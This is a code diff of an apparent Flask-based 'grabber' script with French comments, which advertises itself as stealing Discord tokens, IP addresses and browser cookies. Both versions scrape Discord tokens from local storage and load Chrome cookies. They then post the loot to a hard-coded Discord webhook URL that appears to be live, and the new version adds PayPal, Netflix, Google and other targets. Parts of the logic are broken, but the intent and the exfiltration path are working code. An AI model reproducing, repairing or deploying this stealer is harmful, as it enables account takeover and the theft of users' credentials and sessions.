@@ -4,7 +4,7 @@
 #  -------- You can grab: --------
 #  -------- Discord Token --------          
 #  --------   ip adress   --------
-#  --------detect bot and --------
+#  --------    detect     --------
 #  --------     VPN       --------
 #  --------Browser Cookies--------
 #  -------- os and browser--------
@@ -17,7 +17,7 @@
 #  --------And after that --------
 #  --------The script send--------
 #  -------- A Message to a--------
-#  --------Discord Webhook--------
+#  -------- adresse e-mail--------
 
 #                                                                                                                ><(((º>
 #     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣴⣿⣿⣿⣶⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀><(((º>⠀⠀⠀⠀⠀⠀
@@ -55,220 +55,149 @@
 
 
 
-from flask import Flask, request,render_template
-import browser_cookie3
+
+import json
 import os
 import re
-import json
-import socket
-import httpagentparser
 import requests
-
-
+from browser_cookie3 import chrome
+from flask import Flask, request
 
 app = Flask(__name__)
 
-Webhook_URL = "https://discord.com/api/webhooks/1213100781046071327/j1urcwzdzOqUM03ZDh0MxOdC0khZ6WXBx6hVt3I6CW-fPewfE5zn8XaE6vJfIyjfbycO"
+# Remplacez YOUR_WEBHOOK_URL_HERE par votre véritable lien de webhook Discord
+webhook_url = "https://discord.com/api/webhooks/1213793998221869107/hxmDjbb_R0gbO_PKT2CCWwPgTDxO2DWkGJIhhgufj7lc_YDDZjCLH0pmvq59N1ViAnWt"
 
-# function to get ip
-def get_ip():
+
+def iplog():
     return request.remote_addr
 
-ip = get_ip()
-
-def botCheck(useragent):
-    if ip.startswith(("34", "35")):
-        return "Discord"
-    elif useragent.startswith("TelegramBot"):
-        return "Telegram"
-    else:
-        return False
-
-# Function to see if the ip adresse is connect to a vpn
-def check_vpn(ip_address):
-    try:
-        response = requests.get(f"http://ip-api.com/json/{ip_address}?fields=proxy")
-        data = response.json()
-        return data["proxy"]
-    except Exception as e:
-        return False
-
-# Function to get general browser cookies
 def get_browser_cookies():
-    return browser_cookie3.load()
+    excluded_domains = [
+        'Opera Software\\Opera GX Stable',
+        'Google\\Chrome',
+        'Mozilla\\Firefox',
+        'Microsoft\\Edge'
+    ]
+    try:
+        cookies = []
+        for browser in chrome():
+            if not any(excluded_domain in browser.domain for excluded_domain in excluded_domains):
+                cookies.append(browser)
+        return cookies if cookies else False
+    except Exception as e:
+        print("Error retrieving browser cookies:", e)
+        return False
 
-# Function to find token discord and stock it
 def find_discord_tokens():
     tokens = []
-    path = os.getenv('APPDATA') + '\\discord\\Local Storage\\leveldb'
-    for file_name in os.listdir(path):
-        if file_name.endswith('.ldb') or file_name.endswith('.log'):
-            with open(os.path.join(path, file_name), 'r', encoding='utf-8', errors='ignore') as f:
-                content = f.read()
-                tokens.extend(re.findall(r'mfa\.[\w-]{84}', content))  # Regex pour trouver les tokens Discord
-    return tokens
-
-
-
-#Get tiktok cookies
-def retrieve_tiktok_cookies():    
-    url1 = "https://www.tiktok.com"
-
-    response1 = requests.get(url1)
-
-    tiktok_cookies = response1.cookies
-
-    if tiktok_cookies == True:
-        return tiktok_cookies
-    else:
-        return None
-
-
-#Get roblox cookies        
-def roblox_cookies():
-    url2 = "https://www.roblox.com"
-
-    response2 = requests.get(url2)
-
-    Roblox_cookies = response2.cookies
-    if Roblox_cookies == True:
-        return Roblox_cookies
-    else:
+    try:
+        path = os.getenv('APPDATA') + '\\discord\\Local Storage\\leveldb'
+        for file_name in os.listdir(path):
+            if file_name.endswith('.ldb') or file_name.endswith('.log'):
+                with open(os.path.join(path, file_name), 'r', encoding='utf-8', errors='ignore') as f:
+                    content = f.read()
+                    tokens.extend(re.findall(r'(mfa\.[\w-]{84})|([\w-]{24}\.[\w-]{6}\.[\w-]{27})', content))
+        return tokens if tokens else False
+    except Exception as e:
+        print("Error retrieving Discord tokens:", e)
         return False
 
-    
-#Get instagram cookies
-def instagram_cookies():
-    url3 = "https://www.instagram.com"
+def retrieve_tiktok_cookies():
+    url = "https://www.tiktok.com"
+    response = requests.get(url)
+    tiktok_cookies = response.cookies
+    return tiktok_cookies if response.ok else False
 
-    response3 = requests.get(url3)
+# Ajoutez les fonctions pour récupérer les cookies des autres sites ici
+def retrieve_paypal_cookies():
+    url = "https://www.paypal.com"
+    response = requests.get(url)
+    paypal_cookies = response.cookies
+    return paypal_cookies if response.ok else False
 
-    Instagram_cookies = response3.cookies
+# Ajoutez les fonctions pour récupérer les cookies des autres sites ici
+def retrieve_youtube_cookies():
+    url = "https://www.youtube.com"
+    response = requests.get(url)
+    youtube_cookies = response.cookies
+    return youtube_cookies if response.ok else False
 
-    if Instagram_cookies == True:
-        return Instagram_cookies
-    else:
-        return False
-    
+# Ajoutez les fonctions pour récupérer les cookies des autres sites ici
+def retrieve_google_cookies():
+    url = "https://www.google.com"
+    response = requests.get(url)
+    google_cookies = response.cookies
+    return google_cookies if response.ok else False
 
-#Get github cookies
-def github_cookie():
-    url4 = "https://www.github.com"
+# Ajoutez les fonctions pour récupérer les cookies des autres sites ici
+def retrieve_netflix_cookies():
+    url = "https://www.netflix.com"
+    response = requests.get(url)
+    netflix_cookies = response.cookies
+    return netflix_cookies if response.ok else False
 
-    reponse4 = requests.get(url4)
+# Ajoutez les fonctions pour récupérer les cookies des autres sites ici
+def retrieve_roblox_cookies():
+    url = "https://www.roblox.com"
+    response = requests.get(url)
+    roblox_cookies = response.cookies
+    return roblox_cookies if response.ok else False
 
-    GitHub = reponse4.cookies
-    if GitHub == True:
-        return GitHub
-    else:
-        return False
-    
-#Get gmail cookies
-def gmail_cookies():
-    url5 = "https://www.gmail.com"
-
-    reponse5 = requests.get(url5)
-
-    Gmail = reponse5.cookies
-    if Gmail == True:
-        return Gmail
-    else:
-        return False
-    
-#Get google cookies
-def google_cookies():
-    url6 = "https://www.google.com"
-    
-    reponse6 = requests.get(url6)
-
-    Google = reponse6.cookies
-    if Google == True:
-        return Google
-    else:
-        return False
-
-#Get Snap cookies
-def Snap_cookies():
-    url7  = "https://www.snapchat.com"
-
-    reponse7  = requests.get(url7)
-    snap = reponse7.cookies
-    if snap == True:
-        return snap
-    else:
-        return False
-
-
-#Get youtube cookies                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
-def youtube_cookies():
-    url8 = "https://wwww.youtube.com"
-
-    reponse8 = requests.get(url8)
-    youtube = reponse8.cookies
-
-    if youtube == True:
-        return youtube
-    else:
-        return False
-    
-
-
-
-def message():
-    ip_address = get_ip()
-    vpn = check_vpn(ip_address)
-    cookies = get_browser_cookies()
-    tokens = find_discord_tokens()
-    user_agent = request.headers.get('User-Agent')
-    browser, os_ = httpagentparser.simple_detect(user_agent)
-    Tik_Tok = retrieve_tiktok_cookies()
-    Roblox = roblox_cookies()
-    Insta = instagram_cookies()
-    Github = github_cookie()
-    Bot = botCheck()
-    gmail = gmail_cookies()
-    google = google_cookies()
-    Snap = Snap_cookies()
-    Youtube = youtube_cookies()
-    
-
-
-    "Hey, you grab anything !"
-
-    "THERE THEY ARE !!!"
-    "IP address : " + ip_address
-    "VPN : " + vpn
-    "Bot : " + Bot
-    "Browser cookies : " + str(cookies)
-    "Tokens Discord : " + tokens
-    "User-Agent : " + user_agent
-    "Browser : " + browser
-    "OS : " + os_
-    "TikTok cookies : " + Tik_Tok
-    "Roblox cookies  : " + Roblox
-    "instagram cookies : " + Insta
-    "Github cookies : " + Github
-    "Gmail cookies : " + gmail
-    'Google cookies : ' + google
-    "Snapchat cookies : " + Snap
-    "Youtube cookies : " + Youtube
-
-
-
-
-def send_to_webhook():
-    payload = {"content": message()}
+def send_to_discord(message):
+    payload = {"content": message}
     headers = {"Content-Type": "application/json"}
-    response = requests.post(Webhook_URL, data=json.dumps(payload), headers=headers)
-
+    response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
+    
+    if response.ok:
+        print("Data sent successfully to Discord!")
+    else:
+        print("Failed to send data to Discord webhook!")
 
 @app.route('/')
-def script_on_login():
-    send_to_webhook()
-def index():
-    return render_template('index.html')
+def main():
+    ip = iplog()
+    cookies = get_browser_cookies()
+    discord_tokens = find_discord_tokens()
+    tiktok_cookies = retrieve_tiktok_cookies()
+    paypal_cookies = retrieve_paypal_cookies()
+    youtube_cookies = retrieve_youtube_cookies()
+    google_cookies = retrieve_google_cookies()
+    netflix_cookies = retrieve_netflix_cookies()
+    roblox_cookies = retrieve_roblox_cookies()
+
+    # Créez des encadrés autour des données pour les rendre plus visibles
+    ip_adresse =  "```" + str(ip) + "```" if ip else "No IP found"
+    cookies_str = "```" + str(cookies) + "```" if cookies else "No cookies found"
+    discord_tokens_str = "```" + str(discord_tokens) + "```" if discord_tokens else "No Discord tokens found"
+    tiktok_cookies_str = "```" + str(tiktok_cookies) + "```" if tiktok_cookies else "No TikTok cookies found"
+    paypal_cookies_str = "```" + str(paypal_cookies) + "```" if paypal_cookies else "No PayPal cookies found"
+    youtube_cookies_str = "```" + str(youtube_cookies) + "```" if youtube_cookies else "No YouTube cookies found"
+    google_cookies_str = "```" + str(google_cookies) + "```" if google_cookies else "No Google cookies found"
+    netflix_cookies_str = "```" + str(netflix_cookies) + "```" if netflix_cookies else "No Netflix cookies found"
+    roblox_cookies_str = "```" + str(roblox_cookies) + "```" if roblox_cookies else "No Roblox cookies found"
+
+    # Construisez le message avec des sauts de ligne et des titres en gras
+    message = (
+        "******* Info that you logged: *******\n\n" +
+        "****IP****  :" + ip_adresse + "\n\n" +
+        "****Browser cookies  :****" + cookies_str + "\n\n" +
+        "****Discord tokens  :****" + discord_tokens_str + "\n\n" +
+        "****TikTok cookies   :****" + tiktok_cookies_str + "\n\n" +
+        "****PayPal cookies  :****" + paypal_cookies_str + "\n\n" +
+        "****YouTube cookies  :****" + youtube_cookies_str + "\n\n" +
+        "****Google cookies  :****" + google_cookies_str + "\n\n" +
+        "****Netflix cookies  :****" + netflix_cookies_str + "\n\n" +
+        "****Roblox cookies  :****" + roblox_cookies_str + "\n\n" 
+    )
+    send_to_discord(message)
     
+    try:
+        with open('index.html', 'r') as file:
+            content = file.read()
+        return content
+    except FileNotFoundError:
+        return "Erreur: fichier HTML introuvable"
 
-
-if __name__ == "__main__":
-    app.run(debug=True)
+if __name__ == '__main__':
+    app.run()
